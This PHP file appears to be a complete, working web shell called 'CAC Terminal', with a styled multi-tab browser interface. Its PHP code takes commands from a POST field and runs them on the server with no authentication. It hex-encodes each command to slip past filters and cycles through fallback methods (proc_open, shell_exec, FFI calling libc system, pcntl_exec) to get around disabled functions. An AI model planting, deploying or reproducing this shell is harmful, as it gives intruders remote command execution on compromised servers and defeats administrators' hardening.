<?php

class CommandExecutor {

    public static function getAvailableMethods() {
        $disabled = array_map('trim', explode(',', ini_get('disable_functions')));
        $isWindows = (PHP_OS_FAMILY === 'Windows');

        $methods = [
            'proc_open'   => function_exists('proc_open') && !in_array('proc_open', $disabled),
            'shell_exec'  => function_exists('shell_exec') && !in_array('shell_exec', $disabled),
            'exec'        => function_exists('exec') && !in_array('exec', $disabled),
            'system'      => function_exists('system') && !in_array('system', $disabled),
            'passthru'    => function_exists('passthru') && !in_array('passthru', $disabled),
            'popen'       => function_exists('popen') && !in_array('popen', $disabled),
            'pcntl_exec'  => !$isWindows && function_exists('pcntl_exec') && !in_array('pcntl_exec', $disabled),
            'ffi'         => extension_loaded('ffi') && class_exists('FFI'),
            'expect'      => extension_loaded('expect') && function_exists('expect_popen') && !in_array('expect_popen', $disabled),
        ];

        return array_filter($methods);
    }

    public static function getBestMethod() {
        $available = self::getAvailableMethods();
        if (empty($available)) return null;

        $priority = ['proc_open', 'shell_exec', 'exec', 'system', 'passthru', 'popen', 'expect', 'ffi', 'pcntl_exec'];

        foreach ($priority as $method) {
            if (isset($available[$method]) && $available[$method]) {
                return $method;
            }
        }
        return array_key_first($available);
    }

    public static function run($cmd) {
        $method = self::getBestMethod();
        if (!$method) return "Execution blocked: All methods disabled.";

        switch ($method) {
            case 'proc_open':
                $descriptors = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
                $process = proc_open($cmd, $descriptors, $pipes);
                if (!is_resource($process)) return false;
                $output = stream_get_contents($pipes[1]);
                fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]);
                proc_close($process);
                return $output;

            case 'shell_exec':
                return shell_exec($cmd);

            case 'exec':
                exec($cmd, $outputArray);
                return implode("\n", $outputArray);

            case 'system':
                ob_start(); system($cmd); return ob_get_clean();

            case 'passthru':
                ob_start(); passthru($cmd); return ob_get_clean();

            case 'popen':
                $handle = popen($cmd, 'r');
                if (!$handle) return false;
                $output = stream_get_contents($handle);
                pclose($handle);
                return $output;

            case 'expect':
                $stream = expect_popen($cmd);
                if (!$stream) return false;
                $output = stream_get_contents($stream);
                fclose($stream);
                return $output;

            case 'ffi':
                try {
                    $ffi = \FFI::cdef("int system(const char *command);", PHP_OS_FAMILY === 'Windows' ? 'msvcrt.dll' : 'libc.so.6');
                    ob_start(); $ffi->system($cmd); return ob_get_clean();
                } catch (\Throwable $e) { return false; }

            case 'pcntl_exec':
                return pcntl_exec('/bin/sh', ['-c', $cmd]);

            default:
                return false;
        }
    }
}

// Handle AJAX POST
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd_hex'])) {
    $rawHex = trim($_POST['cmd_hex']);
    $cmd = @hex2bin($rawHex);
    if ($cmd !== false) {
        $output = CommandExecutor::run($cmd);
        $method = CommandExecutor::getBestMethod();
    } else {
        $output = 'Error: Invalid Hex payload.';
        $method = null;
    }
    header('Content-Type: application/json');
    echo json_encode(['output' => $output, 'method' => $method]);
    exit;
}

// Initial load
$initialMethod = CommandExecutor::getBestMethod();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Terminal</title>
    <style>
        /* ========== CAE FILTER BLACK DESIGN (ORIGINAL RED ACCENT) ========== */
        :root {
            --fm-bg-main: #121212;
            --fm-bg-panel: #1C1C1E;
            --fm-border-color: #2C2C2E;
            --fm-text-primary: #F2F2F7;
            --fm-text-muted: #8E8E93;
            --fm-accent: #D31D34;
            --fm-accent-hover: #E5223A;
            --fm-accent-text: #FFF;
            --fm-accent-soft: rgba(211,29,52,0.12);
            --fm-hover-bg: rgba(242,242,247,0.04);
            --fm-focus-ring: rgba(211,29,52,0.3);
            --fm-font-stack: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            --fm-font-mono: 'JetBrains Mono', SFMono-Regular, Menlo, Monaco, Consolas, monospace;
            --fm-radius-lg: 12px;
            --fm-radius-md: 8px;
            --fm-radius-sm: 6px;
            --fm-danger: #FF453A;
            --fm-danger-bg: rgba(255,69,58,0.12);
            --fm-success: #30D158;
            --fm-success-bg: rgba(48,209,88,0.12);
            --fm-transition: all 0.25s ease-in-out;
        }
        .light {
            --fm-bg-main: #F4F4F6;
            --fm-bg-panel: #FFF;
            --fm-border-color: #E5E5EA;
            --fm-text-primary: #1C1C1E;
            --fm-text-muted: #8E8E93;
            --fm-accent: #B51A2B;
            --fm-accent-hover: #9E1423;
            --fm-accent-text: #FFF;
            --fm-accent-soft: rgba(181,26,43,0.08);
            --fm-hover-bg: rgba(28,28,30,0.04);
            --fm-focus-ring: rgba(181,26,43,0.25);
            --fm-danger: #D32F2F;
            --fm-danger-bg: rgba(211,47,47,0.08);
            --fm-success: #2E7D32;
            --fm-success-bg: rgba(46,125,50,0.08);
        }
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            transition: var(--fm-transition);
        }
        body {
            background-color: var(--fm-bg-main);
            color: var(--fm-text-primary);
            font-family: var(--fm-font-stack);
            padding: 32px 24px;
            min-height: 100vh;
            -webkit-font-smoothing: antialiased;
        }
        .container {
            max-width: 1400px;
            margin: 0 auto;
        }
        .header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 28px;
        }
        .logo-text {
            font-size: 28px;
            font-weight: 700;
            letter-spacing: -0.5px;
        }
        .logo-text span {
            color: var(--fm-accent);
        }
        .logo-sub {
            font-size: 11px;
            color: var(--fm-text-muted);
            text-transform: uppercase;
            letter-spacing: 2px;
            font-weight: 500;
        }
        .theme-toggle {
            padding: 8px 16px;
            font-size: 12px;
            font-weight: 600;
            border-radius: var(--fm-radius-md);
            cursor: pointer;
            background: var(--fm-bg-panel);
            color: var(--fm-text-primary);
            border: 1px solid var(--fm-border-color);
            font-family: var(--fm-font-stack);
        }
        .theme-toggle:hover {
            border-color: var(--fm-accent);
            color: var(--fm-accent);
        }
        .card {
            background-color: var(--fm-bg-panel);
            border: 1px solid var(--fm-border-color);
            border-radius: var(--fm-radius-lg);
            overflow: hidden;
            margin-bottom: 24px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
        }
        .card-header {
            padding: 16px 24px;
            border-bottom: 1px solid var(--fm-border-color);
            display: flex;
            align-items: center;
            justify-content: space-between;
            background-color: var(--fm-bg-panel);
            position: relative;
        }
        .card-header::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 3px;
            height: 100%;
            background-color: var(--fm-accent);
        }
        .card-title {
            font-size: 14px;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .card-body {
            padding: 24px;
        }

        /* Tabs */
        .tabs {
            display: flex;
            gap: 2px;
            flex-wrap: wrap;
            align-items: flex-end;
            margin-bottom: 14px;
            border-bottom: 1px solid var(--fm-border-color);
            padding-bottom: 8px;
        }
        .tab-btn {
            background: transparent;
            border: 1px solid var(--fm-border-color);
            border-bottom: none;
            color: var(--fm-text-muted);
            padding: 6px 14px;
            cursor: pointer;
            font-family: var(--fm-font-stack);
            font-size: 14px;
            border-radius: var(--fm-radius-sm) var(--fm-radius-sm) 0 0;
            display: flex;
            align-items: center;
            gap: 8px;
            background: var(--fm-bg-main);
            transition: 0.15s;
        }
        .tab-btn.active {
            background: var(--fm-bg-panel);
            border-color: var(--fm-border-color);
            color: var(--fm-text-primary);
        }
        .tab-btn:hover { color: var(--fm-text-primary); }
        .tab-btn .close {
            color: var(--fm-text-muted);
            font-weight: bold;
            font-size: 16px;
            line-height: 1;
            cursor: pointer;
            opacity: 0.6;
        }
        .tab-btn .close:hover { opacity: 1; color: var(--fm-danger); }
        .add-tab {
            background: transparent;
            border: 1px dashed var(--fm-border-color);
            color: var(--fm-text-muted);
            padding: 6px 16px;
            cursor: pointer;
            border-radius: var(--fm-radius-sm);
            font-family: var(--fm-font-stack);
            font-size: 14px;
            transition: 0.15s;
        }
        .add-tab:hover { color: var(--fm-text-primary); border-color: var(--fm-accent); }

        /* Terminal pane */
        .terminal-pane {
            display: none;
            background: var(--fm-bg-main);
            border-radius: var(--fm-radius-md);
            padding: 4px 0;
        }
        .terminal-pane.active { display: block; }

        .prompt {
            display: flex;
            align-items: center;
            gap: 8px;
            padding: 8px 0;
        }
        .prompt .symbol {
            color: var(--fm-accent);
            font-weight: 600;
            font-size: 16px;
            white-space: nowrap;
        }
        .prompt input {
            flex: 1;
            background: transparent;
            border: none;
            color: var(--fm-text-primary);
            font-family: var(--fm-font-mono);
            font-size: 15px;
            outline: none;
            padding: 4px 0;
        }
        .prompt input::placeholder { color: var(--fm-text-muted); }

        .output-wrap {
            background: var(--fm-bg-panel);
            border: 1px solid var(--fm-border-color);
            border-radius: var(--fm-radius-md);
            padding: 8px 12px;
            margin-bottom: 6px;
        }
        .output-wrap textarea {
            width: 100%;
            min-height: 140px;
            max-height: 400px;
            background: transparent;
            border: none;
            color: var(--fm-text-primary);
            font-family: var(--fm-font-mono);
            font-size: 14px;
            resize: vertical;
            outline: none;
            padding: 4px 0;
            line-height: 1.6;
        }

        .toolbar {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            align-items: center;
            padding: 6px 0;
        }
        .toolbar button {
            background: var(--fm-bg-panel);
            border: 1px solid var(--fm-border-color);
            color: var(--fm-text-muted);
            padding: 4px 14px;
            border-radius: var(--fm-radius-sm);
            cursor: pointer;
            font-family: var(--fm-font-stack);
            font-size: 13px;
            transition: 0.15s;
        }
        .toolbar button:hover { background: var(--fm-hover-bg); color: var(--fm-text-primary); }
        .toolbar .copy-btn { border-color: var(--fm-accent); color: var(--fm-accent); }
        .toolbar .copy-btn:hover { background: var(--fm-accent-soft); }
        .toolbar .clear-btn { border-color: var(--fm-danger); color: var(--fm-danger); }
        .toolbar .clear-btn:hover { background: var(--fm-danger-bg); }
        .toolbar .copy-feedback { color: var(--fm-accent); font-size: 12px; }

        /* History */
        .history-area {
            margin-top: 12px;
            border-top: 1px solid var(--fm-border-color);
            padding-top: 10px;
        }
        .history-toggle {
            color: var(--fm-text-muted);
            font-size: 13px;
            cursor: pointer;
            border-bottom: 1px dashed var(--fm-border-color);
            padding-bottom: 2px;
            display: inline-block;
            font-weight: 500;
        }
        .history-toggle:hover { color: var(--fm-text-primary); }
        .history-list {
            display: none;
            margin-top: 6px;
            padding: 6px 0;
            max-height: 150px;
            overflow-y: auto;
            font-size: 13px;
            font-family: var(--fm-font-mono);
        }
        .history-list.show { display: block; }
        .history-list li {
            padding: 4px 6px;
            color: var(--fm-text-muted);
            border-bottom: 1px solid var(--fm-border-color);
            display: flex;
            justify-content: space-between;
            align-items: center;
            cursor: pointer;
            border-radius: var(--fm-radius-sm);
            transition: 0.1s;
        }
        .history-list li:hover {
            background: var(--fm-hover-bg);
            color: var(--fm-text-primary);
        }
        .history-list li .cmd { color: var(--fm-text-primary); font-weight: 450; }
        .history-list li .time { color: var(--fm-text-muted); font-size: 12px; }

        .history-toolbar button {
            background: transparent;
            border: none;
            color: var(--fm-text-muted);
            cursor: pointer;
            font-family: var(--fm-font-stack);
            font-size: 12px;
            padding: 2px 8px;
            border-radius: var(--fm-radius-sm);
            margin-top: 4px;
        }
        .history-toolbar button:hover { color: var(--fm-danger); background: var(--fm-danger-bg); }

        .status {
            font-size: 12px;
            color: var(--fm-text-muted);
            margin-top: 6px;
        }
        .status .method { color: var(--fm-accent); font-weight: 500; }

        .spinner {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid var(--fm-border-color);
            border-top-color: var(--fm-accent);
            border-radius: 50%;
            animation: spin 0.7s linear infinite;
            vertical-align: middle;
            margin-left: 6px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <div>
            <div class="logo-text">CAC <span>Terminal</span></div>
            <div class="logo-sub">CIGARETTES AFTER COMMAND &bull; SMOKE YOUR COMMAND</div>
        </div>
        <button class="theme-toggle" onclick="toggleTheme()">Toggle Light / Dark</button>
    </div>

    <div class="card">
        <div class="card-header">
            <span class="card-title">Sessions</span>
            <span style="font-size:12px;color:var(--fm-text-muted);">Engine: <span id="engineBadge" style="color:var(--fm-accent);"><?= htmlspecialchars($initialMethod ?: 'None') ?></span></span>
        </div>
        <div class="card-body">
            <!-- Tabs -->
            <div class="tabs" id="tabContainer">
                <button class="add-tab" id="addTabBtn">+ new tab</button>
            </div>
            <!-- Panes -->
            <div id="terminalContainer"></div>
        </div>
    </div>
</div>

<script>
(function() {
    'use strict';

    // ----- State -----
    let tabs = [];
    let activeTabId = null;
    let tabCounter = 0;

    // ----- DOM refs -----
    const tabContainer = document.getElementById('tabContainer');
    const terminalContainer = document.getElementById('terminalContainer');
    const addTabBtn = document.getElementById('addTabBtn');
    const engineBadge = document.getElementById('engineBadge');

    // ----- Helpers -----
    function escapeHtml(str) {
        const div = document.createElement('div');
        div.textContent = str;
        return div.innerHTML;
    }

    // ----- History (sessionStorage per tab) -----
    function loadHistory(tabId) {
        try {
            const data = sessionStorage.getItem('term_history_' + tabId);
            return data ? JSON.parse(data) : [];
        } catch { return []; }
    }
    function saveHistory(tabId, history) {
        try {
            sessionStorage.setItem('term_history_' + tabId, JSON.stringify(history.slice(-30)));
        } catch {}
    }

    // ----- Create a new tab -----
    function createTab() {
        const id = 'tab-' + (tabCounter++);
        const history = loadHistory(id);

        const state = {
            id: id,
            history: history,
            output: '',
            controller: null,
            inputValue: ''
        };
        tabs.push(state);
        if (activeTabId === null) activeTabId = id;

        // ---- Tab button ----
        const btn = document.createElement('button');
        btn.className = 'tab-btn' + (activeTabId === id ? ' active' : '');
        btn.dataset.tabId = id;

        const label = document.createElement('span');
        label.textContent = 'terminal ' + tabs.length;
        btn.appendChild(label);

        const closeBtn = document.createElement('span');
        closeBtn.className = 'close';
        closeBtn.textContent = '×';
        closeBtn.title = 'Close terminal';
        closeBtn.addEventListener('click', function(e) {
            e.stopPropagation();
            closeTab(id);
        });
        btn.appendChild(closeBtn);

        btn.addEventListener('click', function() {
            switchTab(id);
        });

        tabContainer.insertBefore(btn, addTabBtn);

        // ---- Terminal pane ----
        const pane = document.createElement('div');
        pane.className = 'terminal-pane' + (activeTabId === id ? ' active' : '');
        pane.dataset.tabId = id;
        pane.innerHTML = `
            <div class="prompt">
                <span class="symbol">$</span>
                <input type="text" class="cmd-input" placeholder="enter command..." autofocus>
            </div>
            <div class="output-wrap">
                <textarea class="output-area" readonly></textarea>
            </div>
            <div class="toolbar">
                <button class="copy-btn">Copy</button>
                <span class="copy-feedback"></span>
                <button class="clear-btn">Clear</button>
            </div>
            <div class="history-area">
                <span class="history-toggle">▼ history (${history.length})</span>
                <ul class="history-list"></ul>
                <div class="history-toolbar">
                    <button class="clear-history-btn">clear history</button>
                </div>
            </div>
            <div class="status">Method: <span class="method">-</span></div>
        `;
        terminalContainer.appendChild(pane);

        // ---- Set initial placeholder ----
        const textarea = pane.querySelector('.output-area');
        textarea.value = '← enter a command and press Enter';

        // ---- Event listeners ----
        const input = pane.querySelector('.cmd-input');

        // Enter to execute
        input.addEventListener('keydown', function(e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                executeCommand(id);
            }
        });

        // Copy button
        const copyBtn = pane.querySelector('.copy-btn');
        const feedback = pane.querySelector('.copy-feedback');
        copyBtn.addEventListener('click', function() {
            const ta = pane.querySelector('.output-area');
            const text = ta.value;
            if (!text || text === '← enter a command and press Enter') {
                feedback.textContent = 'Nothing to copy';
                setTimeout(() => feedback.textContent = '', 1500);
                return;
            }
            if (navigator.clipboard && navigator.clipboard.writeText) {
                navigator.clipboard.writeText(text)
                    .then(() => {
                        feedback.textContent = 'Copied!';
                        setTimeout(() => feedback.textContent = '', 1800);
                    })
                    .catch(() => {
                        ta.select();
                        document.execCommand('copy');
                        feedback.textContent = 'Copied!';
                        setTimeout(() => feedback.textContent = '', 1800);
                    });
            } else {
                ta.select();
                document.execCommand('copy');
                feedback.textContent = 'Copied!';
                setTimeout(() => feedback.textContent = '', 1800);
            }
        });

        // Clear output button
        pane.querySelector('.clear-btn').addEventListener('click', function() {
            const ta = pane.querySelector('.output-area');
            ta.value = '';
            state.output = '';
            pane.querySelector('.status .method').textContent = '-';
        });

        // History toggle
        const toggle = pane.querySelector('.history-toggle');
        const list = pane.querySelector('.history-list');
        toggle.addEventListener('click', function() {
            const isVisible = list.classList.toggle('show');
            toggle.textContent = isVisible ? '▲ history' : '▼ history (' + state.history.length + ')';
        });

        // Clear history
        pane.querySelector('.clear-history-btn').addEventListener('click', function() {
            if (confirm('Clear history for this tab?')) {
                state.history = [];
                saveHistory(id, []);
                renderHistory(id);
                toggle.textContent = '▼ history (0)';
                list.classList.remove('show');
            }
        });

        // ---- Render initial history ----
        renderHistory(id);

        // ---- Focus input if active ----
        if (activeTabId === id) {
            setTimeout(() => input.focus(), 50);
        }

        return state;
    }

    // ----- Close tab -----
    function closeTab(id) {
        if (tabs.length <= 1) return;
        const state = tabs.find(t => t.id === id);
        if (state && state.controller) state.controller.abort();

        tabs = tabs.filter(t => t.id !== id);
        const btn = tabContainer.querySelector(`.tab-btn[data-tab-id="${id}"]`);
        if (btn) btn.remove();
        const pane = terminalContainer.querySelector(`.terminal-pane[data-tab-id="${id}"]`);
        if (pane) pane.remove();

        if (activeTabId === id) {
            const remaining = tabs[0];
            if (remaining) switchTab(remaining.id);
        }
    }

    // ----- Switch tab -----
    function switchTab(id) {
        if (id === activeTabId) return;
        activeTabId = id;
        document.querySelectorAll('.tab-btn').forEach(btn => {
            btn.classList.toggle('active', btn.dataset.tabId === id);
        });
        document.querySelectorAll('.terminal-pane').forEach(pane => {
            pane.classList.toggle('active', pane.dataset.tabId === id);
        });
        const activePane = document.querySelector('.terminal-pane.active');
        if (activePane) {
            const input = activePane.querySelector('.cmd-input');
            if (input) setTimeout(() => input.focus(), 50);
        }
    }

    // ----- Execute command -----
    function executeCommand(tabId) {
        const state = tabs.find(t => t.id === tabId);
        if (!state) return;
        const pane = document.querySelector(`.terminal-pane[data-tab-id="${tabId}"]`);
        if (!pane) return;

        const input = pane.querySelector('.cmd-input');
        const textarea = pane.querySelector('.output-area');
        const methodSpan = pane.querySelector('.status .method');

        const cmd = input.value.trim();
        if (!cmd) return;

        // Add to history
        state.history.push({ cmd: cmd, time: new Date().toLocaleTimeString() });
        saveHistory(tabId, state.history);
        renderHistory(tabId);
        const toggle = pane.querySelector('.history-toggle');
        toggle.textContent = '▼ history (' + state.history.length + ')';

        textarea.value = 'Executing...';
        methodSpan.textContent = '...';

        if (state.controller) state.controller.abort();
        const controller = new AbortController();
        state.controller = controller;

        let hex = '';
        for (let i = 0; i < cmd.length; i++) {
            hex += cmd.charCodeAt(i).toString(16).padStart(2, '0');
        }
        const formData = new FormData();
        formData.append('cmd_hex', hex);

        fetch(window.location.href, {
            method: 'POST',
            body: formData,
            signal: controller.signal
        })
        .then(res => res.json())
        .then(data => {
            if (data.output !== undefined) {
                textarea.value = data.output;
                state.output = data.output;
                methodSpan.textContent = data.method || '?';
                if (data.method) engineBadge.textContent = data.method;
            } else {
                textarea.value = 'Unexpected response';
            }
            state.controller = null;
        })
        .catch(err => {
            if (err.name === 'AbortError') {
                // ignore
            } else {
                textarea.value = 'Error: ' + err.message;
                methodSpan.textContent = 'error';
            }
            state.controller = null;
        });

        input.value = '';
    }

    // ----- Render history for a tab with click-to-fill -----
    function renderHistory(tabId) {
        const state = tabs.find(t => t.id === tabId);
        if (!state) return;
        const pane = document.querySelector(`.terminal-pane[data-tab-id="${tabId}"]`);
        if (!pane) return;
        const list = pane.querySelector('.history-list');
        if (!list) return;

        if (state.history.length === 0) {
            list.innerHTML = '<li style="color:var(--fm-text-muted);font-style:italic;cursor:default;">No commands yet.</li>';
            return;
        }

        let html = '';
        const reversed = state.history.slice().reverse();
        for (const item of reversed) {
            html += `<li><span class="cmd">${escapeHtml(item.cmd)}</span><span class="time">${item.time}</span></li>`;
        }
        list.innerHTML = html;

        // Click to fill command
        list.querySelectorAll('li').forEach(li => {
            const cmdSpan = li.querySelector('.cmd');
            if (!cmdSpan) return;
            li.addEventListener('click', function() {
                const cmdText = cmdSpan.textContent;
                if (cmdText) {
                    const input = pane.querySelector('.cmd-input');
                    if (input) {
                        input.value = cmdText;
                        input.focus();
                        input.scrollIntoView({ behavior: 'smooth', block: 'center' });
                    }
                }
            });
        });
    }

    // ----- Theme toggle -----
    window.toggleTheme = function() {
        document.body.classList.toggle('light');
        localStorage.setItem('fm_theme', document.body.classList.contains('light') ? 'light' : 'dark');
    };

    // ----- Init -----
    function init() {
        // Restore theme
        const saved = localStorage.getItem('fm_theme');
        if (saved === 'light') document.body.classList.add('light');

        createTab();
        addTabBtn.addEventListener('click', createTab);
    }
    init();
})();
</script>
</body>
</html>
